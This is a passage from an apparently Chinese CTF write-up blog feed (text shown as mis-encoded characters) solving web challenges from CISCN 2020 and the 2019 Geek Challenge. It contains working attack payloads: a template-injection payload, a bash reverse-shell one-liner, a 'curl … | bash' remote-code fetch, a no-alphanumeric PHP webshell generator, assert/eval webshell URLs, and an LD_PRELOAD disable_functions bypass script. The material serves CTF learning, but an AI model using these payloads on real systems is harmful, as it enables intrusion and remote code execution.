ç®€å•æ¥è¯´å°±æ˜¯é—­åˆ<span class="variable"><span class="keyword">if</span></span>è¯­å¥ã€‚</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®ä¹‹å‰çš„é¢˜ç›®ï¼Œç›´æ¥æ„é€ phpinfo</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">a=&#123;<span class="keyword">if</span>:<span class="number">1</span>)(hex2bin(dechex(<span class="number">112</span>)).hex2bin(dechex(<span class="number">104</span>)).hex2bin(dechex(<span class="number">112</span>)).hex2bin(dechex(<span class="number">105</span>)).hex2bin(dechex(<span class="number">110</span>)).hex2bin(dechex(<span class="number">102</span>)).hex2bin(dechex(<span class="number">111</span>)))();die();<span class="comment">//&#125;&#123;end%20if&#125;</span></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿæœ‰å¸ˆå‚…ç”¨åå¼•å·ç»•è¿‡</p>
<p>èµ·ä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œå†™å…¥åå¼¹shellå‘½ä»¤ã€‚</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">bash -c 'bash -i &gt;/dev/tcp/ip/port <span class="number">0</span>&gt;&amp;<span class="number">1</span>'</span><br></pre></td></tr></table></figure>

<p>åå¼¹shell</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">/<span class="string">?a</span>=&#123;<span class="symbol">if:</span><span class="string">`curl ip:port/x |bash`</span>&#125;&#123;<span class="keyword">end</span>+<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›Writeup/image-20200824154556091.png" alt="image-20200824154556091"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up</title>
    <url>/2019/10/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="æ‰“æ¯”èµ›å‰å…ˆæ’¸ä¸€åªçŒ«ï¼-çŒ«çŒ«é™ªæˆ‘æ‰“ctfï¼"><a href="#æ‰“æ¯”èµ›å‰å…ˆæ’¸ä¸€åªçŒ«ï¼-çŒ«çŒ«é™ªæˆ‘æ‰“ctfï¼" class="headerlink" title="æ‰“æ¯”èµ›å‰å…ˆæ’¸ä¸€åªçŒ«ï¼: çŒ«çŒ«é™ªæˆ‘æ‰“ctfï¼"></a>æ‰“æ¯”èµ›å‰å…ˆæ’¸ä¸€åªçŒ«ï¼: çŒ«çŒ«é™ªæˆ‘æ‰“ctfï¼</h2><p>å¼€å±€ä¸€åªçŒ«ï¼Œflagå…¨é æ¡ -_-</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571363272606.png" alt="1571363272606"></p><p>ç›´æ¥F12 æŸ¥çœ‹æºç </p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571363339663.png" alt="1571363339663"></p><p>ç›´æ¥æäº¤cat=dog</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8110/?cat=dog</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571363481025.png" alt="1571363481025"></p><h2 id="ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ"><a href="#ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ" class="headerlink" title="ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ"></a>ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ</h2><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571363676296.png" alt="1571363676296"></p><p>ç¡®å®æ˜¯ç™½ç»™çš„shell</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571373932241.png" alt="1571373932241"></p><p>â€‹       æ ¹ç›®å½•ä¸‹å‘ç°flagç›®å½•ä¸‹çš„flag.txt<br>â€‹<br>â€‹             <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571374018594.png" alt="1571374018594"><br>â€‹<br>â€‹<br>â€‹    </p><a id="more"></a>











<h2 id="BurpSuiiiiiit-æ‹¿èµ·ä½ çš„burpï¼Œå¼€å§‹æˆ˜æ–—å§"><a href="#BurpSuiiiiiit-æ‹¿èµ·ä½ çš„burpï¼Œå¼€å§‹æˆ˜æ–—å§" class="headerlink" title="BurpSuiiiiiit!!!: æ‹¿èµ·ä½ çš„burpï¼Œå¼€å§‹æˆ˜æ–—å§"></a>BurpSuiiiiiit!!!: æ‹¿èµ·ä½ çš„burpï¼Œå¼€å§‹æˆ˜æ–—å§</h2><p>é™„ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œè§£å‹å¾—åˆ°Extender.jaræ–‡ä»¶</p>
<p>ä»åå­—å’Œæ ¼å¼çœ‹åº”è¯¥BurpSuitçš„æ‰©å±•åŒ…ï¼Œç”¨BPå¯¼å…¥</p>
<p>â€‹      <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571495641219.png" alt="1571495641219"></p>
<p>â€‹      <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571374457080.png" alt="1571374457080"><br>â€‹<br>â€‹              å¯¼å…¥å¤±è´¥ï¼Œå¹¶æç¤ºæˆ‘ä»¬æŸ¥çœ‹errorsé¡µé¢<br>â€‹<br>â€‹             <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571374537984.png" alt="1571374537984"></p>
<p>â€‹        flagç›´æ¥å°±å‡ºæ¥äº†</p>
<h2 id="æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦ï¼šåŠ¨ä½œå¿«ç‚¹æ‰èƒ½ç®—åˆ°å¥½å¦ã€‚"><a href="#æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦ï¼šåŠ¨ä½œå¿«ç‚¹æ‰èƒ½ç®—åˆ°å¥½å¦ã€‚" class="headerlink" title="æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦ï¼šåŠ¨ä½œå¿«ç‚¹æ‰èƒ½ç®—åˆ°å¥½å¦ã€‚"></a>æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦ï¼šåŠ¨ä½œå¿«ç‚¹æ‰èƒ½ç®—åˆ°å¥½å¦ã€‚</h2><p>è¾“å…¥å§“åå’Œç”Ÿæ—¥åï¼Œè¿”å›äº†ä¸€ä¸ªè·¯å¾„</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571374815419.png" alt="1571374815419"></p>
<p>ç›´æ¥è®¿é—®è¯•ä¸‹</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571374878503.png" alt="1571374878503"></p>
<p>å›åˆ°ä¸»é¡µï¼ŒæŸ¥çœ‹æºç </p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571374951634.png" alt="1571374951634"></p>
<p>æç¤ºæˆ‘ä»¬æ¡ä»¶ç«äº‰ï¼Œä»æºç çœ‹æˆ‘ä»¬è¾“å…¥uå’Œpåï¼Œflagä¼šå†™å…¥åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$savepath<span class="string">" . sha1($_GET['u'])</span></span><br></pre></td></tr></table></figure>

<p>â€‹        0.1såå†æŠŠflagæ¢æˆ you are too slow</p>
<p>â€‹        æ‰€ä»¥æˆ‘ä»¬å…ˆä¸€ç›´è®¿é—®å­˜åœ¨flagçš„è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶ååœ¨æäº¤uå’Œpï¼Œåœ¨flagç”Ÿæˆçš„ä¸€ç¬é—´æŠŠå®ƒè¯»å–</p>
<p>â€‹        ç›´æ¥ä¸Šburpsuit</p>
<p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571375619875.png" alt="1571375619875"></p>
<p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571376044998.png" alt="1571376044998"></p>
<p>â€‹    payloadè®¾ç½®ä¸ºç©ºï¼Œæ•°é‡200ä¸ªã€‚</p>
<p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571375724646.png" alt="1571375724646"></p>
<p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571375756868.png" alt="1571375756868"></p>
<p>â€‹    payloadåŒæ ·ä¸ºç©ºï¼Œæ•°é‡ä¸º1.</p>
<p>â€‹    2æ”»å‡»åï¼Œ3ç«‹é©¬æ”»å‡»</p>
<p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571375974330.png" alt="1571375974330"></p>
<p>â€‹    å¾—åˆ°flag</p>
<h2 id="Easysql-æœ€è¿‘æˆ‘åšäº†ä¸€ä¸ªå°ç½‘ç«™ï¼Œæˆ‘æŠŠflagæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡æˆ‘æ²¡æœ‰æŠŠç™»é™†å¯†ç å‘Šè¯‰ä»»ä½•äººï¼Œæ‰€ä»¥ä½ ä»¬æ˜¯æ‹¿ä¸åˆ°flagçš„ï¼"><a href="#Easysql-æœ€è¿‘æˆ‘åšäº†ä¸€ä¸ªå°ç½‘ç«™ï¼Œæˆ‘æŠŠflagæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡æˆ‘æ²¡æœ‰æŠŠç™»é™†å¯†ç å‘Šè¯‰ä»»ä½•äººï¼Œæ‰€ä»¥ä½ ä»¬æ˜¯æ‹¿ä¸åˆ°flagçš„ï¼" class="headerlink" title="Easysql: æœ€è¿‘æˆ‘åšäº†ä¸€ä¸ªå°ç½‘ç«™ï¼Œæˆ‘æŠŠflagæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡æˆ‘æ²¡æœ‰æŠŠç™»é™†å¯†ç å‘Šè¯‰ä»»ä½•äººï¼Œæ‰€ä»¥ä½ ä»¬æ˜¯æ‹¿ä¸åˆ°flagçš„ï¼"></a>Easysql: æœ€è¿‘æˆ‘åšäº†ä¸€ä¸ªå°ç½‘ç«™ï¼Œæˆ‘æŠŠflagæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡æˆ‘æ²¡æœ‰æŠŠç™»é™†å¯†ç å‘Šè¯‰ä»»ä½•äººï¼Œæ‰€ä»¥ä½ ä»¬æ˜¯æ‹¿ä¸åˆ°flagçš„ï¼</h2><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571386357741.png" alt="1571386357741"></p>
<p>ä»€ä¹ˆé˜²æŠ¤éƒ½æ²¡æœ‰ </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">'='</span><br><span class="line">'='</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571387426532.png" alt="1571387426532">    </p>
<p>ç›´æ¥è¿›åå°</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571387449879.png" alt="1571387449879"></p>
<h2 id="RCE-me-I-donâ€™t-think-U-can-system-RCE-prove-to-me"><a href="#RCE-me-I-donâ€™t-think-U-can-system-RCE-prove-to-me" class="headerlink" title="RCE me: I donâ€™t think U can system RCE, prove to me"></a>RCE me: I donâ€™t think U can system RCE, prove to me</h2><p>è¿™é“é¢˜å­¦åˆ°äº†å¾ˆå¤šï¼</p>
<p>æ‰“å¼€ç½‘é¡µçœ‹çœ‹</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571495997995.png" alt="1571495997995"></p>
<p>GETä¼ å‚codeï¼Œcodeä¸­ä¸èƒ½æœ‰A-Zï¼Œa-zï¼Œ0-9ï¼Œè¿™äº›å­—ç¬¦ï¼Œè€Œä¸”å­—ç¬¦é™åˆ¶åœ¨40ä¸ªå­—ç¬¦</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¦å…ˆç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>å‚è€ƒ<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">pç¥</a>ä¸å«æ•°å­—å’Œå­—æ¯çš„webshell</p>
<p>æ„é€ è„šæœ¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen</span><span class="params">($pl)</span> </span>&#123;</span><br><span class="line">    $aa = <span class="string">""</span>;</span><br><span class="line">    $bb = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($pl); $j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0xa0</span>; $i &lt; <span class="number">0xff</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i)) == <span class="number">0</span>) &#123;</span><br><span class="line">                $t = chr($i) ^ $pl[$j];</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $t) == <span class="number">0</span>) &#123;</span><br><span class="line">                    $aa .= chr($i);</span><br><span class="line">                    $bb .= $t;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"%"</span>, <span class="string">"\x"</span>, urlencode($aa) . <span class="string">"^"</span> . urlencode($bb) . <span class="string">"\r\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_url</span><span class="params">($pl)</span> </span>&#123;</span><br><span class="line">    $aa = <span class="string">""</span>;</span><br><span class="line">    $bb = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($pl); $j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0xa0</span>; $i &lt; <span class="number">0xff</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i)) == <span class="number">0</span>) &#123;</span><br><span class="line">                $t = chr($i) ^ $pl[$j];</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $t) == <span class="number">0</span>) &#123;</span><br><span class="line">                    $aa .= chr($i);</span><br><span class="line">                    $bb .= $t;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> urlencode($aa) . <span class="string">"^"</span> . urlencode($bb). <span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> gen(<span class="string">"_GET"</span>);</span><br><span class="line"><span class="keyword">echo</span> gen_url(<span class="string">"_GET"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\xA0\xA0\xA0\xA0"</span>^<span class="string">"\xFF\xE7\xE5\xF4"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urldecode(<span class="string">"%A0%A0%A0%A0"</span>)^urldecode(<span class="string">"%FF%E7%E5%F4"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>

<p>æ„é€ å¦‚ä¸‹URl</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>



<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571497597408.png" alt="1571497597408"></p>
<p>æŸ¥çœ‹æŸäº›å…³é”®å‚æ•°</p>
<ul>
<li>â€‹    å¦‚ç³»ç»Ÿä¿¡æ¯</li>
</ul>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571499066521.png" alt="1571499066521"></p>
<ul>
<li>disable_functions</li>
</ul>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571499768310.png" alt="1571499768310"></p>
<p>å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½è¢«ç¦æ­¢äº†</p>
<ul>
<li>allow_url_*</li>
</ul>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571498825445.png" alt="1571498825445"></p>
<p>å…³äºè¿™ä¸¤ä¸ªå‚æ•°å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« <a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">phpä¼ªåè®®</a></p>
<ul>
<li>sendmail_*</li>
</ul>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571499021494.png" alt="1571499021494"></p>
<ul>
<li>open_basedir</li>
</ul>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571500306817.png" alt="1571500306817"></p>
<p>å¹¶æ²¡æœ‰é™åˆ¶æˆ‘ä»¬ç›®å½•ã€‚å¦‚æœæœ‰å¯ä»¥å‚è€ƒè¿™ç¯‡<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/" target="_blank" rel="noopener">æ–‡ç« </a>ç»•è¿‡</p>
<p>æ—¢ç„¶ä¸èƒ½æ‰§è¡Œå‘½ä»¤é‚£å°±ç”¨var_dump(scandir())æ¥æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=var_dump(scandir(%27/tmp/%27));</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571501644752.png" alt="1571501644752"></p>
<p>ä½†æ„Ÿè§‰æŒºéº»çƒ¦çš„ï¼Œåé¢é˜Ÿå‹æäº†ä¸ªè¿™ä¸ª(èººç€çœŸèˆ’æœ )ï¼Œç›´æ¥èšå‰‘è¿(èœåˆ€ä¸è¡Œ)</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571502520704.png" alt="1571502520704"></p>
<p>å‘ç°ä¸»ç›®å½•ä¸‹æœ‰æœ‰flagå’Œreadflagï¼Œflagåªèƒ½rootæ‰èƒ½æŸ¥çœ‹</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571502747158.png" alt="1571502747158"></p>
<p>æŠŠreadflagä¸‹è½½ä¸‹æ¥ï¼Œåç¼–è¯‘äº†ä¸€ä¸‹</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571502795907.png" alt="1571502795907"></p>
<p>é‚£ä¹ˆæ€è·¯ä¹Ÿå°±æ¸…æ™°èµ·æ¥äº†ï¼Œbypass disable_functions  æ‰§è¡Œreadflag</p>
<p>æˆ‘ä»¬è¿™é‡Œåˆ©ç”¨LD_PRELOADåŠ«æŒå…±äº«åº“ï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤</p>
<p>å…·ä½“åŸç†çœ‹çœ‹<a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">å‡ºé¢˜äººçš„åšå®¢</a>å’Œ<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>é¦–å…ˆä¸Šä¼ æ¶æ„soæ–‡ä»¶ï¼Œä¸Šé¢çš„githubé¡¹ç›®ä¸­æœ‰ï¼Œæ³¨æ„æ“ä½œç³»ç»Ÿä½æ•°</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571503296101.png" alt="1571503296101"></p>
<p>å¹¶ä¸”é‡å‘½åä¸º123.so</p>
<p>ç„¶åä¸Šä¼ 123.phpæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶åé€šè¿‡include()åŒ…å«æ–‡ä»¶ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=include(%27/tmp/123.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/123.so</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/1571503618681.png" alt="1571503618681"></p>
<h2 id="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µï¼šTalk-is-easy-show-me-the-code"><a href="#æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µï¼šTalk-is-easy-show-me-the-code" class="headerlink" title="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µï¼šTalk is easy ,show me the code."></a>æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µï¼šTalk is easy ,show me the code.</h2><p>è®¿é—®é¢˜ç›®é¡µé¢ï¼Œç»™äº†æºç </p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    ini_set(<span class="string">"max_execution_time"</span>, <span class="string">"60"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">empty</span>($_GET[<span class="string">"url"</span>]) &amp;&amp; <span class="keyword">die</span>();</span><br><span class="line">    $password = <span class="string">"If I knew where I would die, I would never go there."</span>;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $password);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">startsWith</span><span class="params">($haystack, $needle)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         $length = strlen($needle);</span><br><span class="line">         <span class="keyword">return</span> (substr($haystack, <span class="number">0</span>, $length) === $needle);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $url = $_GET[<span class="string">"url"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!startsWith($url,<span class="string">"http://"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not allow !"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($arr); $i++)  </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">3</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">false</span>);</span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        curl_close($ch);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ($output === $arr[$i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($i == sizeof($arr)<span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Congratulations. Flag is  SYC&#123;********************************&#125;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"password is wrong"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨å…·æœ‰å…¬ç½‘IPçš„æœåŠ¡å™¨ä¸Šï¼Œæ”¾ç½®ä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶</p>
<p>req.php</p>
